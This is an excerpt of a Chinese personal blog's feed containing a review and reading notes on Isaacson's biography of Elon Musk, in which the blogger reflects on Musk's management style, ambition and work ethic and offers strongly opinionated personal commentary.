    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每天读一点，读完了这本最新的厚厚的艾萨克森所写的《埃隆马斯克传》。</p><span id="more"></span><h1 id="聊聊背景"><a href="#聊聊背景" class="headerlink" title="聊聊背景"></a>聊聊背景</h1><p>第一次知道马斯克是在2017年左右，我觉得他不错，但我没有过多关注。到了2020年后关注渐渐多起来，了解了他的公司与所作所为，也开始在推特上关注他。没办法，他天生就是一个引人注目的人。<br>真正的事无巨细了解他，是在2023年4月。也不知是什么契机，我就开始深入了解了，去看他的演讲，他的采访，真正了解他所想而不仅仅是所为。在那个时候我也得知了他有一本传记《硅谷钢铁侠》，但这本传记是在2015年出版，实在距离久远了。并且看了下作者的一些行为，我不认为他是一个写得好马斯克传记的人。<br>但到了2023.9.12，突然得知马斯克的新传记出了。有点诧异，又看了下作家和写作历程，我开始认为这本书是值得一读的。苦于没找到渠道，于是搁置了几天，偶然过了几天发现了一个频道是专门做最新出的电子书。我好奇翻了下，发现真有最新的马斯克传。于是我的阅读之旅便开始了。<br>这本传记读下来很轻松也有趣。大部分时间是在就餐时或快休息时阅读的。看的不算快，估计有15小时左右。</p><h1 id="暴君"><a href="#暴君" class="headerlink" title="暴君"></a>暴君</h1><p>之前看有人说Elon是“硅谷暴君”，我以为只是一种戏称。当真正读完了这部传记，才明白是名副其实。<br>比如，他凌晨2点叫一个员工研究某项目，并要求3小时后提出方案。会对没达到要求的员工破口大骂。会设置一个疯狂的deadline。当他对某人的工作不满意时会解雇他，即使这个人已经跟了他20年。<br>当然，这个暴君和传统意义上的暴君并不完全相同。这个暴君会深入研究技术，他同时是特斯拉和SpaceX的首席工程师。会去基层获得一手信息，提拔有才能的人。<br>特斯拉与spaceX等公司的快速成功与Elon的暴君性格是离不开的。我们在说到暴君时，常常会想到封建王朝统治的君王，独裁者。无疑，Elon是不折不扣的独裁者。那我们就必须思考一个问题：是什么原因导致传统的暴君失败，而Elon这样的暴君却会成功呢？</p><p>所谓暴君，是对待自己的人严厉，喜怒无常的人。我认为有如下原因：</p><ol><li>价值感。Elon的公司都是在做有价值的事，Elon本身也会给员工灌输远大的使命感，这让员工们产生了一种创造价值的自豪感满足感。很多公司的创新犹如塞在牙缝间的食物残渣不值一提，这些公司的员工上班只是为了拿钱混日子。自然是有天壤之别。</li><li>以身作则。人喜欢比较，而Elon看到了这一点，因此他常常住在公司，过着比员工还要辛苦的生活。同时他是几家公司的首席工程师，对技术细节十分了解，而不是外行人的指手画脚。由此员工内心的不平衡感也少了很多，使他们更专注于技术。</li></ol><p>之前看到一则新闻说特斯拉和SpaceX每年收到的简历是360万份，可想而知，人们宁愿待在暴君的公司里，也要创造价值。反衬出当今世界的发展创新有多么不堪！</p><h1 id="格局"><a href="#格局" class="headerlink" title="格局"></a>格局</h1><p>当其他企业家还在努力形成世界观时，他已经形成了宇宙观。</p><p>人们常常喜欢说格局，实际上真正有格局的人又有几个呢？<br>有一些风险就畏缩不前，造成了一点损失就心疼不已，张口闭嘴不过是俗物。格局不是嘴上的说辞，是内心所想。<br>如果一个人在他30岁之前的目标或是梦想，只是有房有车，年薪几十万，婚姻家庭美满。这样的生活当然也幸福，甚至说这就是大多数人所追求的。但我不屑于这样的生活，我希望我的人生更加激烈一些，不是平稳落地，至少要碰撞出火花。<br>一个人看见什么，那么他就能达到与之相同或更低的生活。</p><p>当然，只有格局也不够，还要有与格局相配的器量。而这又是另一件事了。</p><h1 id="工作与生活"><a href="#工作与生活" class="headerlink" title="工作与生活"></a>工作与生活</h1><p>Elon瞧不起“要在工作和生活中找到一种平衡状态”的价值观。<br>黄家驹说：“生命不在于得到什么，而在于做过什么。”<br>我想，伟人的价值观念或许都有很多共通之处。</p><p>工作，意味着是在做创造价值的事。生活则是其它一切享乐，陪伴家人朋友等等的事。<br>工作与生活的平衡大概就是每周工作5天，每天工作8小时这种情况。<br>要解决到底应该如何处置工作与生活的问题，我们要回到一个根本性的问题：我们为什么而活？<br>是为了他人，还是为了自己？是为了得到什么，还是为了做过什么？是为了享受人生，还是为了改变世界？<br>如果答案均为前者，那么工作与生活平衡就是正确选择。如果答案均为后者，那别管什么平衡了，全力以赴对待工作吧！<br>我本人也是倾向于后者的，因为享乐的生活并不有趣。</p><h1 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h1><p>“看看他后来创办的两家公司——SpaceX和特斯拉。”蒂尔说，“按照硅谷的投资和经营哲学，这两家公司的业务都是极其疯狂的赌注。但如果这样两家没人看好的公司都成功了，那么你就得跟自己说：‘我认为埃隆对风险的理解超越了所有人。’”</p><p>一个人能做得很快，但是力量不足。一家公司力量足够，但如果不统一，效率就低下。公司如果高度统一，就是控制人化身的巨人。<br>我认为Elon对于风险的理解是根据物理学和现实合理推导，只要合理的都是行得通的，那么剩下的是人的努力程度。<br>就比如火箭的发射，因为美中苏都能把人送上天，甚至早在几十年前就把人送上月球。符合物理学，也符合现实发展速度。那么这件事就是理论上达得到的。<br>就比如电动车的制造，因为电动车早有发展，电池技术也有突破。符合物理学，也符合现实发展速度。那么这件事就是理论上达得到的。<br>那么为何按照硅谷的投资和经营哲学这两家公司的业务都是疯狂的赌注呢？我认为有2个原因，其一，这件事之前没人成功过；其二，用人方式是以人为本，没有最大限度激发人的潜力。<br>那么Elon既做到了符合现实，也做到了将人统一。那么成功也就不是不可能的事了。</p><h1 id="deadline"><a href="#deadline" class="headerlink" title="deadline"></a>deadline</h1><p>就我对自己和他人的观察来看，在没有压力下，人很容易陷入一种安然自得的心态中。也即自我满足。<br>生于忧患死于安乐，设置deadline本质上是人为地添加一个“忧患”，来防止自己的安乐感。<br>人舒适得生活太久，就会不知道自己的潜力在哪里。在做事的时候，调动的精力不同，那么即便花同样的时间做同一件事效果也会不同。所以重要的不是如何度过一段时间，而是如何最大限度地利用这段时间。<br>设置一个极限的deadline，去把自己逼到极致，这不是很有趣吗？</p><h1 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h1><p>马斯克在推特上回应说：“你并不是在一丝不苟地追求真理，而是在向外界彰显你的‘美德’，以显示你在媒体精英面前是一个‘好人’，你就是想脚踩两只船。”</p><p>事实上，很多人都是采取这种态度。正如在生活中常见的两边吵架不知道该支持哪一边于是决定做裁判。<br>总的来说我认为不知道支持哪一边的原因有几个：<br>1、怕得罪人。因为选择其中一边通常就容易得罪另一边，不想要和一方搞坏关系。<br>2、置身事外。觉得自己理性，能够看到双方的不足之处，也即认为自己是在双方之上的“裁判”。</p><p>这不过是逃避罢了，战胜恐惧才是真正的选择。</p><h1 id="政客"><a href="#政客" class="headerlink" title="政客"></a>政客</h1><p>马斯克对唐纳德·特朗普的态度是深深的鄙夷，认为他就是个骗子，但马斯克同样不认同拜登：“他还是副总统的时候，我和他在旧金山吃过一顿午餐。他在那里滔滔不绝地讲了一个小时，无聊至极，他像个一上弦就能一遍遍重复无聊短语的玩偶。”</p><p>“航空航天这种高端产业的从业者和政府官员都以嘲笑SpaceX和埃隆为乐。”加弗说，“埃隆比他们年轻，比他们富有，拥有硅谷那种创新颠覆者的心态，面对传统行业的桎梏，初生牛犊不怕虎，然而这些都不足以让那些人对他高看一眼。”</p><p>我并不了解政客是什么样的，毕竟我不是。但如果这就是政客，美国的总统就由这些人担任，那也太愚蠢了。</p><h1 id="精英与民主"><a href="#精英与民主" class="headerlink" title="精英与民主"></a>精英与民主</h1><p>马斯克已然踏上了这样一条道路：他要展开一场角斗，一方是他心中那些过犹不及的政治正确思潮，另一方是那些代表着进步思想与社会正义的活动家的觉醒文化思潮。我问他为什么要这么做，他回答说：“那些号称能让人觉醒的心智病毒，比如反科学、反精英、反人类思潮，如果不从根本上铲除它们，人类文明永远都不会成为星际文明。”</p><p>哎，世上永远都是蠢蛋多。</p><h1 id="五步工作法及其推论"><a href="#五步工作法及其推论" class="headerlink" title="五步工作法及其推论"></a>五步工作法及其推论</h1><p>工作法包含了五大步骤：1.质疑每项要求。提出任何一项要求时，都应该附上提出这一要求的人。永远不要接受一项来自某个部门的要求，比如来自“法务部门”或者“安全部门”的要求。你必须知道提出这项要求的人的名字。接下来你应该质疑它，不管这个人有多聪明。聪明人提出的要求才是最危险的，因为人们不太可能质疑他们。这件事要一直做下去，即便这项要求来自我马斯克本人。质疑后，大家就要改进要求，让它变得不那么愚蠢。<br>2.删除要求当中所有你能删除的部分和流程，虽然你可能还得把它们加回来。事实上，你如果最后加回来的部分还不到删除部分的10%，那就说明你删减得还不够。<br>3.简化和优化。这应该放在第2步之后，因为人们常犯的错误就是简化和优化一个原本不应该存在的部分或者流程。<br>4.加快周转时间。每个流程都可以加快，但只有遵循了前三个步骤之后才能这么做。在特斯拉工厂，我错误地把很多精力花在加快生产流程上，后来我才意识到有些流程原本就应该被拿掉。<br>5.自动化。在内华达工厂和弗里蒙特工厂犯下的一个大错就是我一开始试图将每个步骤进行自动化改造。我们本应该先质疑所有要求，删除不必要的部分和流程，把问题筛出来、处理掉，然后再推进自动化。</p><p>这套工作法有时还衍生出一些推论，包括：<br>• 所有技术经理都必须有实战经验，比如说软件团队的管理人员必须至少花20%的时间进行编程，太阳能屋顶业务的经理必须花时间在屋顶上亲自做安装工作。否则光说不练，他们就像是不会骑马的骑兵队队长、不会舞刀弄枪的将军。<br>• “你好，我好，大家好”是很危险的，人们会因此不再质疑同事的工作成果。人们天然有一种倾向是不想把要好的同事踢下船，而这种危险倾向一定要避免。<br>• 犯错没关系，但错了还不肯低头就不行。<br>• 永远不要要求你的团队做你自己都不愿意做的事。<br>• 每当有问题需要解决时，不要只与你直接管理的相关负责人聊。深入调研就要跨层级沟通，去跟你属下的属下直接交流吧。<br>• 招聘要招态度端正的人。技能是可以教的，但要扭转一个人的工作态度可就太费劲了，得给他“换个脑子”。<br>• 疯狂的紧迫感是我们公司运作的法则。<br>• 唯一要遵守的规则就是物理学定律能推导出来的规则，其他一切都只是建议。</p><h1 id="总体感受"><a href="#总体感受" class="headerlink" title="总体感受"></a>总体感受</h1><p>这本书读了会带给人怎样的收获呢？我认为有以下几点：</p><ol><li>对于不打算效仿的人来说，了解了世上原来还有这种人，为整个人类思考，每天疯狂工作，不遵守社会规则。</li><li>对于世界观还未形成或未完善的人来说，会带来剧烈的冲击。</li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>可惜的是没能在看完的第一时间写完感想，这导致我遗忘了不少，看的时候感想多，写的时候却不怎么样。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;每天读一点，读完了这本最新的厚厚的艾萨克森所写的《埃隆马斯克传》。&lt;/p&gt;</summary>
    
    
    
    <category term="读后感" scheme="http://example.com/categories/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
    <category term="埃隆马斯克传" scheme="http://example.com/categories/%E8%AF%BB%E5%90%8E%E6%84%9F/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0/"/>
    
    
    <category term="读后感" scheme="http://example.com/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
    <category term="马斯克" scheme="http://example.com/tags/%E9%A9%AC%E6%96%AF%E5%85%8B/"/>
    
  </entry>
  
  <entry>
    <title>埃隆马斯克传--读书笔记</title>
    <link href="http://example.com/2023/10/13/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0--%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2023/10/13/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0--%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2023-10-12T16:00:00.000Z</published>
    <updated>2023-10-13T07:26:07.113Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨晚读完了艾萨克森写的马斯克传记，作为一本读了20天的书，我也有许多想做笔记的地方。</p><span id="more"></span><h1 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><font color=red>当其他企业家还在努力形成世界观时，他已经形成了宇宙观。</font></p><p><font color=blue>格局很重要，看到什么，就会影响自己做什么。</font></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><font color=red>十几岁的时候，埃隆开始觉得缺了点儿什么。他说宗教和科学对于存在的解释都没有解决真正的大问题，比如宇宙从何而来，它为什么会存在？物理学可以讲明白关于宇宙的一切，除了这个“为什么”。这导致了他所谓的“青春期存在主义危机”。“我想要弄清楚生命和宇宙的意义是什么，”埃隆说，“但我为此感到非常沮丧，好像生命可能就没有什么意义。”</font><br><font color=blue>或许每个会独立思考的人都会有这种思考。我只是在思考生命没什么意义后就随波逐流。</font></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><font color=red>“你和埃罗尔在一起会有一种感觉，可能会发生非常糟糕的事情。如果丧尸末日那样的场景出现了，你会想加入埃隆的团队，因为他会想出办法让那些丧尸老实待着，排好队。他可能非常严厉，但在末日来临之际，你可以信赖他，他总能找到胜利的曙光。”</font><br><font color=blue>世界末日之时，Elon这样的人才能带领我们活下去。</font></p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><font color=red>从职业生涯的一开始，马斯克就是一个苛刻的管理者，瞧不起“要在工作和生活中找到一种平衡状态”的价值观。</font><br><font color=blue>我对工作和生活的关系，一直处于摇摆不定的态度，有时觉得工作多于生活好，有时觉得工作与生活平衡比较好。就我个人的所作所为而言，我还是倾向于后者的。在大多数没有全力关心一件事时，都是想着工作一会儿就娱乐一会儿。<br>现在我应该是彻底改变了想法：工作要远大于生活。这个世界上没有人比他更耀眼了，也没其他人或思想能够再动摇我的看法了。</font></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><font color=red>他觉得自己这辈子要么富可敌国，要么倾家荡产，没有第三种可能。</font><br><font color=blue>这是他二十岁左右说的话，现在看来是前者：富可敌国。</font></p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p><font color=red>“看看他后来创办的两家公司——SpaceX和特斯拉。”蒂尔说，“按照硅谷的投资和经营哲学，这两家公司的业务都是极其疯狂的赌注。但如果这样两家没人看好的公司都成功了，那么你就得跟自己说：‘我认为埃隆对风险的理解超越了所有人。’”</font><br><font color=blue>我炒币过一段时间，自认为对风险有一定了解。不过在Elon面前都不过是班门弄斧。<br>如果想要在这个世界过得舒适，那么像金融那样做风险控制或许是正确的。但如果想给这个世界带来些改变些什么，那么我认为要像Elon这样行事才是正确的方式。</font></p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><font color=red>第一，他发现技术进步并不是必然的，戳穿这一点既令人感到惊讶，也让人心生恐惧——技术可能停滞，也可能倒退。美国人已经登上月球，但随后航天飞行项目搁浅，并无相关进展。他质问道：“我们是想告诉下一代，我们做到登月就到头儿了，就不做了，是吗？”古埃及人学会了建造金字塔，但后来这些知识就遗失了。古罗马也出现了同样的情况，他们修建了水渠和其他了不起的建筑，却在黑暗时代失去了一切。这种情况是否会发生在美国？“人们错误地认为技术会自动进步，”几年后，他在TED演讲中说，“只有当很多人为此不懈奋斗，它才会至臻完善。”<br>第二，殖民其他星球有助于确保人类文明和意识的保留和赓续，以防我们脆弱的地球家园遭遇不测——有一天它可能会被小行星撞击、核战争或气候变化所摧毁。他对“费米悖论”非常痴迷，它是以意大利裔美国物理学家恩里科·费米命名的，他在讨论宇宙中的外星生命时说：“可外星人都在哪里呢？”从数学上看，存在其他文明似乎是合乎逻辑的，但由于缺乏证据，一种令人不安的可能性大大增加——地球上的人类可能是唯一的生命意识范本。“我们这支火苗微弱的意识蜡烛在这里闪烁，它可能是宇宙中唯一的意识实体，所以我们必须保护好它。”马斯克说，“如果我们能到达其他星球，相比于小行星撞击地球或人类文明自毁可能带来的严重后果，人类意识可能延续的时间将会大大变长。”<br>第三，他的这一动机更加鼓舞人心，他出生在一个冒险者家族，继承了这个家族的精神内核，他在十几岁时就决定搬到一个以拓荒者精神为民族之魂的国家。马斯克说：“美国实际上是一片淬炼出了人类探索精神的高地，这是一片冒险者的土地。”他认为，这种精神需要在美国被重新点燃，而实现这一点的最好方法是推进殖民火星的任务。“在火星上建立基地的困难程度超乎想象，可能会有人在途中死去，就像人们到新大陆定居时发生的那样。但它能极大地鼓舞人心，我们对这个世界必须抱有希望，必须有能够振奋人心的东西。”他认为，人生在世不能只是为了解决问题，人必须追求伟大的梦想。“那个值得追求的东西，是能让我们从睡梦中醒来去迎接崭新一天的东西。”</font><br><font color=blue>在没有听过Elon的这句话前。很多人说，世界的进步(技术，科学，社会等各种进步)是必然的，他们会说即使没有爱因斯坦也会有其他人发现相对论。<br>我当时对这种观点的态度是不置可否。因为我既不认为他们说的正确，也没有深入思考过推翻他们说法的事。<br>当听过Elon的话后，我明白了世界的进步不是必然的。这一定是由一个个改变世界的天才所引领的，这些天才无可替代！他们值得被后世铭记。<br>人生在世不能只是为了解决问题，人必须追求伟大的梦想。这句话我认为非常正确。虽然不是要求每个人都这么做，但这么做的人无疑已经和凡庸者区别开了。<br>在我看来，这个世界的前方就如同荆棘的路，凡庸者不过是路上的肉垫，而伟大的人踏着凡庸者的身体带领人类抵达前方。凡庸者并不是一无是处，他们的作用就是肉垫，当然每个凡庸者都能被其他人随时被替代。</font></p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><font color=red>埃隆是在使命感的驱动下顺势而为，先行好事，后问前程。</font><br><font color=blue>当今世上多少人，是先问前程，再行好事，甚至都不是“好事”呢？和这样的人待在一起，恐怕自身都会腐朽吧。</font></p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p><font color=red>“用佛教的话来说，这是一场关于因果报应的考验。”马斯克说，“就像恺撒在元老院被刺死一样，我在PayPal被政变的领导者推翻后，本可以说‘你们这些人，真是烂透了’，但我没有这么说。如果我同他们势同水火，创始人基金就不会在2008年注资SpaceX，SpaceX无疑会死掉。我不喜欢类似占星术的烂玩意儿，但因果报应可能是真的。”</font><br><font color=blue>人生太短，别轻易抱起仇恨。</font></p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><font color=red>“航空航天这种高端产业的从业者和政府官员都以嘲笑SpaceX和埃隆为乐。”加弗说，“埃隆比他们年轻，比他们富有，拥有硅谷那种创新颠覆者的心态，面对传统行业的桎梏，初生牛犊不怕虎，然而这些都不足以让那些人对他高看一眼。”</font><br><font color=blue>可见，这个世界已经腐朽成什么样了。<br>即使在美国，大多数人也不过是安然享乐，人类在固步自封。<br>像Elon这样的人只是少数，能与这样的人共事是一种幸运。</font></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><font color=red>他说这两个人都有强迫症，但是是好的那种。埃里森说：“强迫症是他们成功的原因之一，因为他们执着于解决一个问题，不达目的不罢休。”马斯克与乔布斯的不同之处在于，他的这种习惯不仅体现在产品设计方面，还体现在他对基础科学、工程和制造的问题研究当中。“史蒂夫只需要把设计理念和软件工程做好，制造环节是外包的。”埃里森说，“而埃隆承担起了制造、供应链和巨型工厂等各个方面。”乔布斯喜欢每天走进苹果公司的设计工作室看看，但他从未去过苹果在中国的工厂。相比之下，马斯克泡在装配线上的时间比他在设计工作室里的时间还多，他说：“与设计一家工厂所需的脑力劳动相比，设计车的脑力劳动不值一提。”</font><br><font color=blue>人们喜欢对比，Elon和乔布斯做对比。很明显作者的倾向是Elon。<br>乔布斯更多的是活在的是8090后的心中吧，00后的了解实际是比较少的，因为00后成年的时候乔布斯早已不再人世。<br>不过我对乔布斯也同样抱有敬意，他也是引领人类前进的天才之一。我想他在电子设备行业所做的创新至少加快了这个行业20年的进程。为整个人类发展的进步也至少提高了8年的进程。<br>很可惜的是，现在的苹果市值2.8万亿美元达到了富可敌国的水平，在乔布斯离开后再也难有大的创新了，只是一家求稳健的成熟公司，成为了大部分公司追求的榜样。</font></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><font color=red>他喜欢专注于工作的状态，有时他把生活的其他部分视为对工作的打扰，令他感到不悦。马斯克承认：“我花在工作上的时间太多了，以至于任何关系都很难维持下去。SpaceX和特斯拉都在艰难度日，同时兼顾两家公司的我举步维艰，所以我只能把所有时间都放在工作上。”</font><br><font color=blue>可以说工作已经内化Elon为一部分了。“把生活的其他部分视为对工作的打扰”这给人印象很深。</font></p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p><font color=red>工作法包含了五大步骤：1.质疑每项要求。提出任何一项要求时，都应该附上提出这一要求的人。永远不要接受一项来自某个部门的要求，比如来自“法务部门”或者“安全部门”的要求。你必须知道提出这项要求的人的名字。接下来你应该质疑它，不管这个人有多聪明。聪明人提出的要求才是最危险的，因为人们不太可能质疑他们。这件事要一直做下去，即便这项要求来自我马斯克本人。质疑后，大家就要改进要求，让它变得不那么愚蠢。<br>2.删除要求当中所有你能删除的部分和流程，虽然你可能还得把它们加回来。事实上，你如果最后加回来的部分还不到删除部分的10%，那就说明你删减得还不够。<br>3.简化和优化。这应该放在第2步之后，因为人们常犯的错误就是简化和优化一个原本不应该存在的部分或者流程。<br>4.加快周转时间。每个流程都可以加快，但只有遵循了前三个步骤之后才能这么做。在特斯拉工厂，我错误地把很多精力花在加快生产流程上，后来我才意识到有些流程原本就应该被拿掉。<br>5.自动化。在内华达工厂和弗里蒙特工厂犯下的一个大错就是我一开始试图将每个步骤进行自动化改造。我们本应该先质疑所有要求，删除不必要的部分和流程，把问题筛出来、处理掉，然后再推进自动化。</font><br><font color=blue>五步工作法不仅仅运用在工作上，也可包含在生活的方方面面。老实说，我认为运用在工作中不太容易，因为只是一个员工就要质疑要求，那么大概率得到的不是赞赏而是批评。这种只有当作为了高层的时候才有资格这么说。</font></p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><font color=red>这套工作法有时还衍生出一些推论，包括：<br>• 所有技术经理都必须有实战经验，比如说软件团队的管理人员必须至少花20%的时间进行编程，太阳能屋顶业务的经理必须花时间在屋顶上亲自做安装工作。否则光说不练，他们就像是不会骑马的骑兵队队长、不会舞刀弄枪的将军。<br>• “你好，我好，大家好”是很危险的，人们会因此不再质疑同事的工作成果。人们天然有一种倾向是不想把要好的同事踢下船，而这种危险倾向一定要避免。<br>• 犯错没关系，但错了还不肯低头就不行。<br>• 永远不要要求你的团队做你自己都不愿意做的事。<br>• 每当有问题需要解决时，不要只与你直接管理的相关负责人聊。深入调研就要跨层级沟通，去跟你属下的属下直接交流吧。<br>• 招聘要招态度端正的人。技能是可以教的，但要扭转一个人的工作态度可就太费劲了，得给他“换个脑子”。<br>• 疯狂的紧迫感是我们公司运作的法则。<br>• 唯一要遵守的规则就是物理学定律能推导出来的规则，其他一切都只是建议。</font><br><font color=blue>第一条用一个成语概括是纸上谈兵。<br>第二条也可用一个成语概况是大义灭亲。<br>第三条用四个字概括是知错就改。<br>第四条用一句论语概况是己所不欲勿施于人。<br>最后一条给我做事的阈值提高了很多，在原本就有所出格的情况下提升了很多。只要不违法物理学定律都可以。</font></p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><font color=red>一位工程师指出了一个显而易见的问题，那就是真车的底盘要大得多，没有铸造机可以处理这么大块的东西。马斯克对这个答案并不满意，他说：“去想想怎么做吧，不就是搞一台更大的铸造机吗？又不是说要打破物理学定律了。”</font><br><font color=blue>我做“出格”的事时，会有所意识。但Elon没有，因为他对“出格”的事定义为违反物理学定律。普通人的出格是违反常理。</font></p><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p><font color=red>那年夏天，他向波音公司的一位副总裁介绍了SpaceX如何推动年轻工程师开拓创新。“如果波音不做出改变，”他说，“行业顶级人才就会流失。”副总裁回答说，波音公司不需要聘用这些想在技术上搞颠覆式创新的人，“也许我们想招的就不是什么顶尖人才，我们要的是能踏踏实实在这长期干下去的人”。</font><br><font color=blue>即使是一个优秀的人才，待在泥潭里，最终也无所作为。<br>特斯拉和SpaceX基本上都是从0到10000的公司，在短时间内达到如此的变革。我认为并不是因为人才比其他公司优秀好几倍，而是环境比其他公司好了很多。<br>在现在这个时代，想要打造一片自己的环境非常难。即使是在马斯克那个时代，物质条件和自身条件也有很高要求。如果做不到打造自己的环境，那就去一片好的环境吧。待遇都是其次。</font></p><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p><font color=red>马斯克已然踏上了这样一条道路：他要展开一场角斗，一方是他心中那些过犹不及的政治正确思潮，另一方是那些代表着进步思想与社会正义的活动家的觉醒文化思潮。我问他为什么要这么做，他回答说：“那些号称能让人觉醒的心智病毒，比如反科学、反精英、反人类思潮，如果不从根本上铲除它们，人类文明永远都不会成为星际文明。”</font><br><font color=blue>觉醒运动是愚蠢的。就像共产主义一样愚蠢。</font></p><h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p><font color=red>能被冠以“世界首富”称号的人本就凤毛麟角，而就在这一小撮人当中，马斯克和盖茨身上还有着一些相似的地方。二人都擅长缜密的分析，有着如激光一般全神贯注的能力，还有一种智识上的优越感，这种优越感渐渐演化成了一种傲慢——他俩都受不了愚蠢的人。</font><br><font color=blue>缜密的分析和全神贯注的能力，做不到…但是我受不了愚蠢的人。</font></p><h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p><font color=red>我问他为什么不克制一下自己，他愉快地承认，他经常“搬起石头，砸自己的脚”，还经常“自己挖坑，自己跳”，但生活需要趣味横生，需要激动人心，他说着就引用起2000年上映的电影《角斗士》中他最喜欢的一句台词：“你不觉得这很有趣吗？你不就是为了这个才来这儿的吗？</font><br><font color=blue>有趣比完美更重要。</font></p><h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p><font color=red>那推特算什么呢？马斯克在4月告诉我：“一开始我拿我这些发自初心的宏大使命往上套，结果发现推特套不进去，但我已经开始渐渐相信，推特可以成为保护人类文明这一使命的一部分，在人类成为跨行星物种之前，给人类社会争取更多时间。”何出此言呢？一部分原因关涉到言论自由。“媒体中似乎充斥着越来越多的群体思维，不敢越雷池一步，所以如果你没有站在他们的队里，他们就会孤立你，你想喊也发不出声音。”他认为，对于民主的赓续，重要的是铲除推特中盛行的“觉醒文化”，打破偏见，让大家眼中的推特成为一个开放的空间，可以对各种意见兼收并蓄。</font><br><font color=blue>群体思维不适用于喜欢变化的人。</font></p><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p><font color=red>段鹏飞说：“我当时连轴转了几个月，没有休息一天，实在太累了，感觉被榨干了。自动驾驶日之后，我就退出了特斯拉，但过了9个月，我又感到很无聊，所以我打电话给老板，求他让我回来。我决定了，宁可被榨干，也绝不混天度日。”</font><br><font color=blue>挺棒的。这样的工作在生理上会带来痛苦，精神上却得到富足。</font></p><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><p><font color=red>马斯克在推特上回应说：“你并不是在一丝不苟地追求真理，而是在向外界彰显你的‘美德’，以显示你在媒体精英面前是一个‘好人’，你就是想脚踩两只船。”</font><br><font color=blue>我曾经也有很长一段时间在彰显“美德”，后来我意识到这样并不是智慧。只不过是一种讨巧的理想主义。这个世界从不完美。<br>我们绝大多数时候都是在做几个选择，这几个选择都有优点缺点，让人难以分辨，但最终我们都要选择一条路。而有的人故作聪明想要踏两只船。<br>我的看法是，选择其中一条路的不一定有智慧，但两条路都选的一定没有智慧。<br>不要彰显“美德”，不要做“好人”，勇敢地选择一条路并坚定地前行吧！</font></p><h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p><font color=red>当他醒过神来以后，突然变得富有哲理起来，他说：“文明就是这样衰落的，因为他们放弃了冒险。当他们放弃了冒险事业，文明的动脉就会硬化。每年，真刀真枪的实干家越来越少，动动嘴皮子吹哨的裁判员却越来越多。”这就是为什么美国再也造不出高铁和能够登月的火箭，“躺在功劳簿上太久，你就会失去冒险的欲望”。</font><br><font color=blue>实干家身先士卒，裁判员养尊处优。这里的裁判员在我看来不仅仅包括政府人员，还有那些整天评判他人所作所为的网友。<br>如果人类的最终目标是为了让生活舒适，那不如灭亡！</font></p><h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><p><font color=red>有时候，伟大的创新者就是与风险共舞的孩子，他们拒绝被规训。他们可能草率鲁莽，处事尴尬，有时甚至引发危机，但或许他们也很疯狂——疯狂到认为自己真的可以改变世界。</font><br><font color=blue>这句话作为结尾很不错~</font></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;昨晚读完了艾萨克森写的马斯克传记，作为一本读了20天的书，我也有许多想做笔记的地方。&lt;/p&gt;</summary>
    
    
    
    <category term="读书笔记" scheme="http://example.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="马斯克" scheme="http://example.com/tags/%E9%A9%AC%E6%96%AF%E5%85%8B/"/>
    
    <category term="读书笔记" scheme="http://example.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试之信息收集</title>
    <link href="http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
